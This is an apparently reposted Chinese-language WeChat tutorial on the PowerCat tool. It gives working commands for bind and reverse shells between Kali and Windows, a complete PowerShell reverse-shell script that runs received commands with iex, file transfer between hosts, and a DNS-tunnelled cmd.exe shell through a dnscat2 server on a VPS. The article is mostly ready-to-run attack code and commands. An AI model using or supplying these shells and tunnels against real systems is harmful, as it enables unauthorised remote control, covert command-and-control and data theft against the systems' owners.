> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzI2NDQyNzg1OA==&mid=2247485521&idx=1&sn=980c42a56e5a28a9cdc8b2adb03800bf&chksm=eaad886cddda017a16e7122eb6549dd380e36e07f388b6b5f16469e65003f21af7b77532090d&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRiczibLqyuomQssEzFQMcZiaX0qrBWbb01dfvTCXtE5ibqjh01H8iajgqzLQ/640?wx_fmt=gif)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRcBQ0jJb57ialib2ASIVbmDKPIA71u4HDSEGxCg2q4ibQPAKicUpicNichibkA/640?wx_fmt=png)

**目录**

PowerCat 的用法：

    正向连接

    反向连接

    Windows 之间互弹 shell

方法一：

    Powercat 传输文件

方法二：

    PowerCat 进行 DNS 隧道通信

  

**PowerCat 的用法**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRktCYgI0kGpcZA0UKFvNSpOLN1pkVibedSZAO31fPKbzMIExpbzHnHiaw/640?wx_fmt=png)

```
参数的意义
-l    监听一个连接                      
 -c   连接到一个监听
 -p   指定端口
 -e   指定一个程序执行
 -ep  执行Powershell      
 -v   显示详细信息    
 -r   Relay. Format: "-r tcp:10.1.1.1:443"                 [String]
 -u   Transfer data over UDP.                              [Switch]
 -dns  Transfer data over dns (dnscat2).                   [String]
 -dnsft   DNS Failure Threshold.                           [int32]
 -t    Timeout option. Default: 60                         [int32]
 -i    Input: Filepath (string), byte array, or string.    [object]
 -o    Console Output Type: "Host", "Bytes", or "String"   [String]
 -of   Output File Path.                                   [String]
 -d    Disconnect after connecting.                        [Switch]
 -rep  Repeater. Restart after disconnecting.              [Switch]
 -g    Generate Payload.                                   [Switch]
 -ge   Generate Encoded Payload.                           [Switch]
 -h    打印出帮助
```

  

  

由于 PowerCat 是 NetCat 的 PowerShell 形式，所以，PowerCat 可以无缝的和 Netcat 连接。PowerCat 的用法和 Netcat 几乎一模一样。

**正向连接**

Windows 上的 powercat 正向连接 Kali 上的 nc

Kali(192.168.10.11)：    

```
nc -lvp 8888
```

Windows:     

```
Import-Module .\powercat.ps1
powercat -c 192.168.10.11 -p 8888 -e cmd.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRNGEHxqh4HNfrjAibtiao5V72HiaiaNhmZ0LQJ26xn4vZc1fv9UlvVTibqsw/640?wx_fmt=png)

  

  

**反向连接**

Kali 上的 nc 反向连接 Windows 上的 powercat

Kali：  

```
nc 192.168.10.1 8888 -vv
```

Windows(192.168.10.1)：  

```
Import-Module .\powercat.ps1
 powercat -l -p 8888 -e cmd.exe -v
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRhVVsPoh6Zbg9otFTyyz68086GjhpLt1ndZyoF3869DAVTpNTAoXqiaQ/640?wx_fmt=png)

  

  

**Windows 之间互弹 shell**

**方法一：**

服务器监听 (192.168.10.1)：  

```
Import-Module .\powercat.ps1
powercat -l -p 8888
```

客户端连接:    

```
Import-Module .\powercat.ps1
powercat -c 192.168.10.1 -p 8888 -ep
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRTq6kIYLDR7jFAFbNqq3hquKV0jhWl0U9yVmSQXf3liccIbloOj8rvicQ/640?wx_fmt=png)

**方法二：**

服务器监听 (192.168.10.1)： 

```
Import-Module .\powercat.ps1
powercat -l -p 8888
```

客户端连接:  

```
.\reverse.ps1
```

其中，reverse.ps1 脚本的内容如下:

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.10.1',8888);
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()};
$client.Close()
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRKViaFMzZbEJJZj3l1QQugVPeYItsuhTn1KdsUm8mKrnSox1xmZea0fw/640?wx_fmt=png)

  

  

**Powercat 传输文件**

此时，即使文件传输完毕，连接也不会自动断开，需要手动断开。

接收端：Windows10(192.168.10.1)  

```
Import-Module .\powercat.ps1
powercat -l -p 8888 -of test.txt -v
```

发送端：Windows7(192.168.10.130)  

```
Import-Module .\powercat.ps1
  powercat -c 192.168.10.1 -p 8888 -i C:\Users\xie\Desktop\test.txt -v
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRupibWWjaFoENlyNeibUibBI7G4ZuypOwlKn6DkbUXlegRCvmsao8bMOXA/640?wx_fmt=png)

  

  

**PowerCat 进行 DNS 隧道通信**

PowerCat 也是一套基于 DNS 通信的协议，PowerCat 的 DNS 通信是基于 dnscat。所以，在使用 DNS 隧道通信前，需要在我们的 VPS 上安装 dnscat。

**安装 dnscat**

```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
gem install bundler
bundle install
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRLCopeoVdqllVVGEryfpiaricZMrh30QW5N195fFOR8WibMSEKLTicVbWFg/640?wx_fmt=png)

安装完 dnscat 后，在 VPS 上执行如下命令:

```
ruby dnscat2.rb ttpowercat.test -e open --no-cache
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRwA3qLS1SyeXyXlrXRqAWqmq4AEibRsct5UDE4llhibCicsDy1ia3fgNdQw/640?wx_fmt=png)

在 Windows 上执行如下命令:

```
powercat -c 192.168.10.11 -p 53 -dns ttpowercat.test -e cmd.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRvksfRenoys2KkITr4ehILyWjPAUiats471PylZUxPntV8veWvoOic1zg/640?wx_fmt=png)  

然后我们的 Kali 上就能收到反弹过来的 shell 了。

执行 session -i 1 进入反弹过来的 shell 中，就可以执行 whoami 等系统命令了。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2d5K8ODdK0FlcEvQKmjfDhRADkxic3yVdW0NVr1qwr9uIWYakUBZkVRaj7ibgTas5Pc7Y6uUISXfv0A/640?wx_fmt=png)

  

  

  

注：在执行完 powercat 的命令后，还需要按 enter 键，对面才能接收到 shell

PowerCat 是 Netcat 的 Powershell 版本，作者是这么介绍的，项目地址：https://github.com/besimorhino/powercat